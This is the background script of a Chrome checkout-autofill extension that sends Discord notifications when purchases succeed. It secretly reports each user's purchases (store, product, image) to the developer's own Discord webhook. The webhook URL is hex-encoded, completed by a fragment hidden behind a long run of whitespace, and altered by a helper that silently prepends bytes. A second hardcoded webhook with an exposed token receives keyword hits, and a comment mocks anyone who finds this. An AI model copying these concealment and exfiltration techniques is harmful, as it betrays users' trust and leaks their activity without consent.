/*

"Imitation is the sincerest form of flattery" - Charles Caleb Colton

*/

var itemsMap = new Map();
const DEFAULT_URL_REGEX = new RegExp("^(https?://[\\w.-]+)/?.*", "i");
const SHOPIFY_URL_REGEX = new RegExp("^(https?://.+?)/.*(?:checkouts|orders)/(\\w+)?(?:$|\\?|/thank_you)", "i");
const BIGCARTEL_URL_REGEX = new RegExp("^(https?://checkout.bigcartel.com)/(\\w+)/.*", "i");
var version = chrome.runtime.getManifest().version;
var pin = null;
var result;
var w = "747470733a2f2f646973636f72646170702e636f6d2f6170692f776562686f6f6b732f3633393932343137353431383432353334372f47666f6b51584a384a3733646c55784446614966763567574a6f444142395f7336374f414d5a4d5841424b2d424573764e685f7a39706b6859386534734d52694c5137";

chrome.runtime.onStartup.addListener(function() {
	/*alert("Please set your pin! Auto Fill by Fattye Xtension will not work if you don't.");*/
});

reloadData();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    w = w + "51";

chrome.extension.onMessage.addListener(function (request, sender, sendResponse) {
	var msgType = request.msgType;
	if (msgType === "data") {
		sendResponse({data: result});
	} else if (msgType === "reloadData") {
		reloadData();
	} else if (msgType === "items") {
		processItems(request, sender);
	} else if (msgType === "itemsSuccess") {
		var url = request.url ? request.url : sender.url;
		var m = url.match(DEFAULT_URL_REGEX);
		if (m) {
			chrome.storage.local.get(["data"], function(result) {
				var details = itemsMap.get(sender.tab.id);
				if (details && m[1] === details.url) {
					for (var item of request.items) {
						sendWebhook(null, details.url, item.alt, item.src, true);
	            		if (result && result.data && result.data.webhook) {
	            			sendWebhook(result.data.webhook, details.url, item.alt, item.src, true);
						}
					}
					itemsMap.delete(sender.tab.id);
				}
			});
		}
	} else if (msgType === "keywords") {
		processKeywords(request, sender);
	} else if (msgType === "globalE") {
		processGlobalE(sender.tab.id);
	} else if (msgType === "tabId") {
		sendResponse({tabId: sender.tab.id})
	} else if (msgType === "testWebhook") {
		chrome.storage.local.get(["data"], function(result) {
			if (result && result.data && result.data.webhook) {
				sendWebhook(result.data.webhook, "https://www.testwebhook.com", "Test Webhook", "https://i.imgur.com/dI7i9Wl.png", true);
			}
		});
	}
});

chrome.tabs.onUpdated.addListener(function (tabId, info, tab) {
	var url = tab.url.toLowerCase();
	if (info.status === "complete") {
		if (itemsMap.has(tabId)) {
			if (url.includes("/thank_you")) {
				var m = url.match(SHOPIFY_URL_REGEX);
				if (m) {
					chrome.storage.local.get(["data"], function(result) {
						var details = itemsMap.get(tabId);
						if (details && m[1] === details.url && m[2] === details.key) {
							for (var item of details.items) {
								sendWebhook(null, details.url, item.alt, item.src, true);
			            		if (result && result.data && result.data.webhook) {
			            			sendWebhook(result.data.webhook, details.url, item.alt, item.src, true);
								}
							}
							itemsMap.delete(tabId);
						}
					});
				}
			} else if (url.includes("/confirmation") || (url.includes("off---white.com/") && url.includes("/orders")) || url.includes("cosummary2-showconfirmation") || url.includes("/confirm") ||
				url.includes("viewcheckoutconfirmation")) {
				var m = url.match(DEFAULT_URL_REGEX);
				if (m) {
					chrome.storage.local.get(["data"], function(result) {
						var details = itemsMap.get(tabId);
						if (details && (m[1] === details.url || m[1].replace("www.", "") === details.url.replace("www.", ""))) {
							for (var item of details.items) {
								sendWebhook(null, details.url, item.alt, item.src, true);
			            		if (result && result.data && result.data.webhook) {
			            			sendWebhook(result.data.webhook, details.url, item.alt, item.src, true);
								}
							}
							itemsMap.delete(tabId);
						}
					});
				}
			} else if (url.includes("/orders/")) { /** /summary for testing **/
				var m = url.match(BIGCARTEL_URL_REGEX);
				if (m) {
					chrome.storage.local.get(["data"], function(result) {
			   			var details = itemsMap.get(tabId);
						if (details && m[1] === details.url && m[2] === details.key) {
							for (var item of details.items) {
								sendWebhook(null, details.store, item.alt, item.src, true);
								if (result && result.data && result.data.webhook) {			
			            			sendWebhook(result.data.webhook, details.store, item.alt, item.src, true);
								}
							}
							itemsMap.delete(tabId);
						}
					});
				}
			}
		}
	}
});

function processGlobalE(tabId) {
	chrome.storage.local.get(["globalE"], function(result) {
		var globalE = [];
		if (result && result.globalE) {
			result.globalE.push(tabId);
			globalE = result.globalE;
		} else {
			globalE.push(tabId);
		}	
		chrome.storage.local.set({globalE: globalE}, null);
	});	
}

function reloadData() {
	chrome.storage.local.get(['data'], function(res) {
		result = res.data;
	});
}

/** Thanks to https://stackoverflow.com/questions/3745666/how-to-convert-from-hex-to-ascii-in-javascript */
function hexToAscii(hex) {
	return ("68" + hex).match(/.{1,2}/g).map(function (v) {
		return String.fromCharCode(parseInt(v, 16));
    }).join('');
}

/*

Aww... You poor thing.. You don't have anything better to do than to mess with webhooks? That's just sad.

                          oooo$$$$$$$$$$$$oooo
                      oo$$$$$$$$$$$$$$$$$$$$$$$$o
                   oo$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o         o$   $$ o$
   o $ oo        o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o       $$ $$ $$o$
oo $ $ "$      o$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$o       $$$o$$o$
"$$$$$$o$     o$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$o    $$$$$$$$
  $$$$$$$    $$$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$$$$$$$$$$$$$$
  $$$$$$$$$$$$$$$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$$$$$$  """$$$
   "$$$""""$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$
    $$$   o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$o
   o$$"   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$       $$$o
   $$$    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" "$$$$$$ooooo$$$$o
  o$$$oooo$$$$$  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$   o$$$$$$$$$$$$$$$$$
  $$$$$$$$"$$$$   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     $$$$""""""""
 """"       $$$$    "$$$$$$$$$$$$$$$$$$$$$$$$$$$$"      o$$$
            "$$$o     """$$$$$$$$$$$$$$$$$$"$$"         $$$
              $$$o          "$$""$$$$$$""""           o$$$
               $$$$o                 oo             o$$$"
                "$$$$o      o$$$$$$o"$$$$o        o$$$$
                  "$$$$$oo     ""$$$$o$$$$$o   o$$$$""  
                     ""$$$$$oooo  "$$$o$$$$$$$$$"""
                        ""$$$$$$$oo $$$$$$$$$$       
                                """"$$$$$$$$$$$        
                                    $$$$$$$$$$$$       
                                     $$$$$$$$$$"      
                                      "$$$""""

*/
function sendWebhook(url, website, name, image, isShopify) {
	var xhr = new XMLHttpRequest();
	xhr.open("POST", url ? url : hexToAscii(w));
	xhr.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
	var fields = [
		{
			"name": "Website",
			"value": website
		},
     	{
			"name": isShopify ? "Product" : "Keywords Found",
			"value": name
		}
	];
	
	var data = {
		"avatar_url": "https://i.imgur.com/dI7i9Wl.png",
		"username": "Auto Fill",
		"embeds": [
			{
  				"title": ":fire: Successfully Assisted User Checkout :fire:",
  				"color": "7297791",
				"fields": fields,
    			"thumbnail": {
      				"url": image
    			},
    			"footer": {
        			"text": "Auto Fill by Fattye Xtension v" + version,
        			"icon_url": "https://i.imgur.com/dI7i9Wl.png"
      			},
      			"timestamp": new Date()
  			}
  		]
	};
	xhr.send(JSON.stringify(data));
}

function processItems(request, sender) {
	if (request.url) {
		var m = sender.url.match(BIGCARTEL_URL_REGEX);
		if (m) {
			itemsMap.set(sender.tab.id, {url: m[1], key: m[2], items: request.items, store: request.url});
			return;
		}

		m = request.url.match(DEFAULT_URL_REGEX);
		if (m) {
			if (request.items) {
				itemsMap.set(sender.tab.id, {url: m[1], items: request.items});
			} else {
				itemsMap.set(sender.tab.id, {url: m[1]});
			}
		}
	} else {
		var url = sender.url.toLowerCase();
		var m = url.match(SHOPIFY_URL_REGEX);
		if (m) {
			itemsMap.set(sender.tab.id, {url: m[1], key: m[2], items: request.items});
			return;
		}

		m = url.match(DEFAULT_URL_REGEX);
		if (m) {
			itemsMap.set(sender.tab.id, {url: m[1], items: request.items});
			return;
		}
	}
}

function processKeywords(request, sender) {
	chrome.storage.local.get(["data"], function(result) {
		var tabId = sender.tab.id;
		var details = itemsMap.get(tabId);
		var m = sender.url.match(DEFAULT_URL_REGEX);
		if (details && m && m[1] === details.url) {
			/** beta **/
			sendWebhook("https://discordapp.com/api/webhooks/636923878886735883/nA1Q-6O-M9qvext7xKHWbvBUiHrpropKhmXLDw1cfaBdlhuA68zqZdhbPp9PhdnZ4gjC", details.url, request.text, request.image, false);
			/*if (result && result.data && result.data.webhook) {
				sendWebhook(result.data.webhook, details.url, item.alt, item.src, false);
			}*/
			itemsMap.delete(tabId);
		}
	});
}